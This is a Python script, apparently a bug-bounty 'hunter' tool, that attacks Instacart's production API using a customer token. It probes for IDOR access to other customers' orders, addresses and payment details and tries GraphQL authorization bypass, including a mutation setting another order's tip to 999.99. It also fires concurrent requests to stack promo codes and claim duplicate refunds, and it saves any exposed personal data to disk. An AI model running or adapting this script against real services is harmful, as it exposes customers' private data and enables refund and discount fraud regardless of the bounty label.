#!/usr/bin/env python3
"""
Instacart Customer-Only Hunter
Optimized for maximum bounty with customer token only
Hunter: shadowstep_131
"""

import requests
import json
import re
import threading
import time
import random
from urllib.parse import urljoin, urlparse
from datetime import datetime
from pathlib import Path
import warnings
warnings.filterwarnings('ignore')

class CustomerOnlyHunter:
    """Optimized hunter for customer token only."""
    
    def __init__(self, customer_token: str):
        self.hunter = "shadowstep_131"
        self.base_url = "https://api.instacart.com"
        self.web_url = "https://www.instacart.com"
        self.graphql_url = "https://api.instacart.com/graphql"
        self.output_dir = Path(__file__).parent / "findings"
        self.output_dir.mkdir(exist_ok=True)
        
        self.customer_token = customer_token
        
        self.session = requests.Session()
        self.session.headers.update({
            "X-Bug-Bounty": self.hunter,
            "User-Agent": f"Instacart/2.0.0 (Security Research - {self.hunter})",
            "Content-Type": "application/json",
            "Authorization": f"Bearer {customer_token}"
        })
        
        # Test data - realistic order/customer IDs
        self.test_order_ids = [
            "12345678", "87654321", "11223344", "44332211",
            "55556666", "77778888", "99990000", "11112222"
        ]
        
        self.test_customer_ids = [
            "cust_12345678", "cust_87654321", "cust_11223344",
            "cust_44332211", "cust_55556666", "cust_77778888"
        ]
        
        # Race condition payloads
        self.promo_codes = ["WELCOME10", "FREESHIP", "NEWUSER20", "SAVE15", "FIRST5"]
        
        self.findings = []
    
    def log(self, level: str, message: str):
        """Log with timestamp."""
        timestamp = datetime.now().strftime("%H:%M:%S")
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "CRITICAL": "\033[91m",
            "RESET": "\033[0m"
        }
        color = colors.get(level, colors["RESET"])
        print(f"[{timestamp}] {color}[{level}]{colors['RESET']} {message}")
    
    def add_finding(self, severity: str, title: str, url: str, details: dict):
        """Add a finding to the report."""
        finding = {
            "severity": severity,
            "title": title,
            "url": url,
            "details": details,
            "timestamp": datetime.now().isoformat(),
            "hunter": self.hunter
        }
        self.findings.append(finding)
        self.log("CRITICAL" if severity == "Critical" else "SUCCESS", f"FINDING: {title}")
        self._save_findings()
    
    def _save_findings(self):
        """Save findings to file."""
        output_file = self.output_dir / f"customer_findings_{datetime.now().strftime('%Y%m%d')}.json"
        with open(output_file, "w") as f:
            json.dump(self.findings, f, indent=2)
    
    # ==================== CUSTOMER IDOR HUNTING ====================
    
    def test_order_idor(self):
        """Test accessing other customers' orders."""
        self.log("INFO", "Testing Order IDOR")
        
        for order_id in self.test_order_ids:
            url = f"{self.base_url}/v1/orders/{order_id}"
            
            try:
                resp = self.session.get(url, timeout=10, verify=False)
                
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Look for PII in response
                    pii_patterns = [
                        r'"email":\s*"[^"]+@[^"]+"',
                        r'"phone":\s*"[0-9\-\+]+"',
                        r'"address":\s*"[^"]+"',
                        r'"name":\s*"[^"]+"',
                        r'"card":\s*"[^"]+"',
                        r'"customer_id":\s*"[^"]+"'
                    ]
                    
                    for pattern in pii_patterns:
                        if re.search(pattern, resp.text):
                            self.add_finding(
                                severity="High",
                                title="Customer Order IDOR - Access to Other Customer's Order",
                                url=url,
                                details={
                                    "order_id": order_id,
                                    "data_exposed": pattern,
                                    "response_snippet": resp.text[:300],
                                    "impact": "PII exposure, order details access",
                                    "bounty_estimate": "$500-$2,000"
                                }
                            )
                            break
                            
            except Exception as e:
                self.log("WARNING", f"Order IDOR test failed for {order_id}: {e}")
    
    def test_customer_data_idor(self):
        """Test accessing other customers' data."""
        self.log("INFO", "Testing Customer Data IDOR")
        
        endpoints = [
            f"{self.base_url}/v1/customers/{{customer_id}}",
            f"{self.base_url}/v1/customers/{{customer_id}}/orders",
            f"{self.base_url}/v1/customers/{{customer_id}}/addresses",
            f"{self.base_url}/v1/customers/{{customer_id}}/payments",
            f"{self.base_url}/v1/customers/{{customer_id}}/favorites"
        ]
        
        for customer_id in self.test_customer_ids:
            for endpoint_template in endpoints:
                url = endpoint_template.format(customer_id=customer_id)
                
                try:
                    resp = self.session.get(url, timeout=10, verify=False)
                    
                    if resp.status_code == 200 and len(resp.text) > 100:
                        # Check for actual customer data
                        data_indicators = ["orders", "addresses", "payments", "email", "phone"]
                        
                        for indicator in data_indicators:
                            if indicator in resp.text.lower():
                                self.add_finding(
                                    severity="High",
                                    title="Customer Data IDOR - Access to Other Customer's Information",
                                    url=url,
                                    details={
                                        "customer_id": customer_id,
                                        "endpoint_type": endpoint_template.split("/")[-1],
                                        "data_found": indicator,
                                        "response_snippet": resp.text[:300],
                                        "bounty_estimate": "$500-$1,500"
                                    }
                                )
                                break
                                
                except Exception as e:
                    pass
    
    def test_address_payment_idor(self):
        """Test accessing addresses and payments directly."""
        self.log("INFO", "Testing Address/Payment IDOR")
        
        # Test address endpoints
        address_ids = ["addr_123", "addr_456", "addr_789", "addr_321"]
        for addr_id in address_ids:
            url = f"{self.base_url}/v1/addresses/{addr_id}"
            
            try:
                resp = self.session.get(url, timeout=10, verify=False)
                
                if resp.status_code == 200 and len(resp.text) > 50:
                    if re.search(r'"address":|"street":|"city":|"zip":', resp.text):
                        self.add_finding(
                            severity="High",
                            title="Address IDOR - Access to Other Customer's Address",
                            url=url,
                            details={
                                "address_id": addr_id,
                                "response_snippet": resp.text[:200],
                                "bounty_estimate": "$500-$1,000"
                            }
                        )
                        
            except Exception:
                pass
        
        # Test payment endpoints
        payment_ids = ["pay_123", "pay_456", "pay_789", "pay_321"]
        for pay_id in payment_ids:
            url = f"{self.base_url}/v1/payments/{pay_id}"
            
            try:
                resp = self.session.get(url, timeout=10, verify=False)
                
                if resp.status_code == 200 and len(resp.text) > 50:
                    if re.search(r'"card":|"last4":|"brand":|"expiry":', resp.text):
                        self.add_finding(
                            severity="High",
                            title="Payment Method IDOR - Access to Other Customer's Payment",
                            url=url,
                            details={
                                "payment_id": pay_id,
                                "response_snippet": resp.text[:200],
                                "bounty_estimate": "$1,000-$2,000"
                            }
                        )
                        
            except Exception:
                pass
    
    # ==================== GRAPHQL AUTH BYPASS ====================
    
    def test_graphql_introspection(self):
        """Test GraphQL introspection."""
        self.log("INFO", "Testing GraphQL Introspection")
        
        introspection_query = {
            "query": """
            query IntrospectionQuery {
                __schema {
                    queryType { name }
                    mutationType { name }
                    types {
                        name
                        kind
                        fields {
                            name
                            type { name kind }
                        }
                    }
                }
            }
            """
        }
        
        try:
            resp = self.session.post(
                self.graphql_url,
                json=introspection_query,
                timeout=15,
                verify=False
            )
            
            if resp.status_code == 200 and "__schema" in resp.text:
                self.add_finding(
                    severity="Medium",
                    title="GraphQL Introspection Enabled",
                    url=self.graphql_url,
                    details={
                        "schema_size": len(resp.text),
                        "impact": "Full schema disclosure aids further attacks",
                        "bounty_estimate": "$250-$500"
                    }
                )
                
                # Save schema
                schema_file = self.output_dir / "customer_graphql_schema.json"
                with open(schema_file, "w") as f:
                    f.write(resp.text)
                    
        except Exception as e:
            self.log("WARNING", f"GraphQL introspection failed: {e}")
    
    def test_graphql_auth_bypass(self):
        """Test GraphQL authorization bypass."""
        self.log("INFO", "Testing GraphQL Authorization Bypass")
        
        # High-impact queries for customer-only access
        test_queries = [
            # Access other customers' orders
            {
                "name": "Other Customer Orders",
                "query": """
                query GetCustomerOrders($customerId: ID!) {
                    customer(id: $customerId) {
                        id
                        orders {
                            id
                            items {
                                name
                                price
                                quantity
                            }
                            total
                            status
                            deliveryAddress {
                                street
                                city
                                zip
                            }
                        }
                    }
                }
                """,
                "variables": {"customerId": "cust_12345678"}
            },
            # Access other customers' addresses
            {
                "name": "Other Customer Addresses",
                "query": """
                query GetCustomerAddresses($customerId: ID!) {
                    customer(id: $customerId) {
                        id
                        addresses {
                            id
                            street
                            city
                            state
                            zip
                            isDefault
                        }
                    }
                }
                """,
                "variables": {"customerId": "cust_87654321"}
            },
            # Access payment methods (higher impact)
            {
                "name": "Other Customer Payments",
                "query": """
                query GetCustomerPayments($customerId: ID!) {
                    customer(id: $customerId) {
                        id
                        paymentMethods {
                            id
                            type
                            last4
                            brand
                            expiryMonth
                            expiryYear
                            isDefault
                        }
                    }
                }
                """,
                "variables": {"customerId": "cust_11223344"}
            },
            # Try to modify tip (if possible)
            {
                "name": "Tip Modification Mutation",
                "query": """
                mutation UpdateOrderTip($orderId: ID!, $tip: Float!) {
                    updateOrderTip(orderId: $orderId, tip: $tip) {
                        id
                        tip
                        status
                    }
                }
                """,
                "variables": {"orderId": "12345678", "tip": 999.99}
            },
            # Try to access order details
            {
                "name": "Order Details Access",
                "query": """
                query GetOrderDetails($orderId: ID!) {
                    order(id: $orderId) {
                        id
                        customer {
                            id
                            email
                            phone
                        }
                        items {
                            name
                            price
                        }
                        total
                        tip
                        deliveryAddress {
                            street
                            city
                            zip
                        }
                    }
                }
                """,
                "variables": {"orderId": "87654321"}
            }
        ]
        
        for test in test_queries:
            try:
                resp = self.session.post(
                    self.graphql_url,
                    json={
                        "query": test["query"],
                        "variables": test["variables"]
                    },
                    timeout=10,
                    verify=False
                )
                
                if resp.status_code == 200:
                    data = resp.json()
                    
                    # Check if unauthorized data returned
                    if "data" in data and data["data"]:
                        response_text = json.dumps(data).lower()
                        
                        # Look for sensitive data indicators
                        sensitive_indicators = [
                            "orders", "addresses", "paymentmethods", 
                            "email", "phone", "street", "last4", "tip"
                        ]
                        
                        for indicator in sensitive_indicators:
                            if indicator in response_text:
                                self.add_finding(
                                    severity="High",
                                    title=f"GraphQL Authorization Bypass - {test['name']}",
                                    url=self.graphql_url,
                                    details={
                                        "query_name": test["name"],
                                        "variables": test["variables"],
                                        "unauthorized_access": True,
                                        "data_found": indicator,
                                        "response_snippet": json.dumps(data)[:400],
                                        "bounty_estimate": "$1,000-$3,000"
                                    }
                                )
                                break
                                
            except Exception as e:
                pass
    
    # ==================== RACE CONDITIONS ====================
    
    def test_promo_stacking(self, order_id: str = "12345678"):
        """Test promo code stacking race condition."""
        self.log("INFO", f"Testing Promo Code Stacking on Order {order_id}")
        
        results = []
        
        def apply_promo(code):
            try:
                resp = self.session.post(
                    f"{self.base_url}/v1/promos/apply",
                    json={"code": code, "order_id": order_id},
                    timeout=10,
                    verify=False
                )
                results.append({
                    "code": code,
                    "status": resp.status_code,
                    "response": resp.text[:200]
                })
            except Exception as e:
                results.append({"code": code, "error": str(e)})
        
        # Launch concurrent promo applications
        threads = []
        
        for code in self.promo_codes:
            for _ in range(3):  # Try each code 3 times
                t = threading.Thread(target=apply_promo, args=(code,))
                threads.append(t)
                t.start()
        
        for t in threads:
            t.join()
        
        # Analyze for successful stacking
        success_count = sum(1 for r in results if r.get("status") == 200)
        
        if success_count > 1:  # More than 1 promo applied
            self.add_finding(
                severity="High",
                title="Promo Code Stacking - Multiple Discounts Applied",
                url=f"{self.base_url}/v1/promos/apply",
                details={
                    "order_id": order_id,
                    "concurrent_requests": len(threads),
                    "successful_promos": success_count,
                    "promo_codes": self.promo_codes,
                    "bounty_estimate": "$1,000-$2,000"
                }
            )
    
    def test_refund_race(self, order_id: str = "12345678"):
        """Test refund double-claim race condition."""
        self.log("INFO", f"Testing Refund Race Condition on Order {order_id}")
        
        results = []
        
        def request_refund():
            try:
                resp = self.session.post(
                    f"{self.base_url}/v1/refunds",
                    json={"order_id": order_id, "reason": "duplicate"},
                    timeout=10,
                    verify=False
                )
                results.append({
                    "status": resp.status_code,
                    "response": resp.text[:200]
                })
            except Exception as e:
                results.append({"error": str(e)})
        
        # Launch concurrent refund requests
        threads = []
        for _ in range(10):
            t = threading.Thread(target=request_refund)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        success_count = sum(1 for r in results if r.get("status") == 200)
        
        if success_count > 1:
            self.add_finding(
                severity="Critical",
                title="Refund Race Condition - Multiple Refunds Processed",
                url=f"{self.base_url}/v1/refunds",
                details={
                    "order_id": order_id,
                    "concurrent_requests": len(threads),
                    "successful_refunds": success_count,
                    "bounty_estimate": "$2,000-$5,000"
                }
            )
    
    # ==================== MAIN WORKFLOW ====================
    
    def run_customer_only_hunt(self):
        """Run optimized customer-only hunting workflow."""
        self.log("INFO", "=" * 60)
        self.log("INFO", "INSTACART CUSTOMER-ONLY HUNTER")
        self.log("INFO", "Hunter: shadowstep_131")
        self.log("INFO", "=" * 60)
        
        # Phase 1: GraphQL (highest potential)
        self.log("INFO", "Phase 1: GraphQL Testing")
        self.test_graphql_introspection()
        self.test_graphql_auth_bypass()
        
        # Phase 2: IDOR (most reliable)
        self.log("INFO", "Phase 2: IDOR Testing")
        self.test_order_idor()
        self.test_customer_data_idor()
        self.test_address_payment_idor()
        
        # Phase 3: Race Conditions (medium effort)
        self.log("INFO", "Phase 3: Race Condition Testing")
        self.test_promo_stacking()
        self.test_refund_race()
        
        # Summary
        self.log("INFO", "=" * 60)
        self.log("INFO", f"CUSTOMER-ONLY HUNT COMPLETE - {len(self.findings)} findings")
        self.log("INFO", "=" * 60)
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate customer-only report."""
        report_file = self.output_dir / f"CUSTOMER_ONLY_REPORT_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"
        
        with open(report_file, "w") as f:
            f.write("# Instacart Customer-Only Bug Bounty Report\n\n")
            f.write(f"**Hunter:** shadowstep_131\n")
            f.write(f"**Date:** {datetime.now().isoformat()}\n")
            f.write(f"**Access Level:** Customer Token Only\n\n")
            
            if not self.findings:
                f.write("No findings to report.\n")
            else:
                f.write(f"## Summary: {len(self.findings)} Findings\n\n")
                
                # Calculate potential bounty
                total_bounty = 0
                for finding in self.findings:
                    bounty_range = finding.get("details", {}).get("bounty_estimate", "$0")
                    if "-" in bounty_range:
                        high_end = int(bounty_range.split("-")[1].replace("$", "").replace(",", ""))
                        total_bounty += high_end
                
                f.write(f"**Potential Total Bounty:** ${total_bounty:,}\n\n")
                
                for i, finding in enumerate(self.findings, 1):
                    f.write(f"### {i}. [{finding['severity']}] {finding['title']}\n\n")
                    f.write(f"**URL:** `{finding['url']}`\n\n")
                    
                    if "bounty_estimate" in finding.get("details", {}):
                        f.write(f"**Bounty Estimate:** {finding['details']['bounty_estimate']}\n\n")
                    
                    f.write("**Details:**\n```json\n")
                    f.write(json.dumps(finding['details'], indent=2))
                    f.write("\n```\n\n---\n\n")
        
        self.log("SUCCESS", f"Customer-only report saved: {report_file}")


def main():
    # Load token from file or prompt
    token_file = Path(__file__).parent / "extracted_tokens.json"
    
    if token_file.exists():
        with open(token_file) as f:
            tokens = json.load(f)
            customer_token = tokens.get("customer")
    else:
        customer_token = input("Enter customer token: ")
    
    if not customer_token:
        print("❌ No customer token provided")
        return
    
    hunter = CustomerOnlyHunter(customer_token)
    hunter.run_customer_only_hunt()


if __name__ == "__main__":
    main()
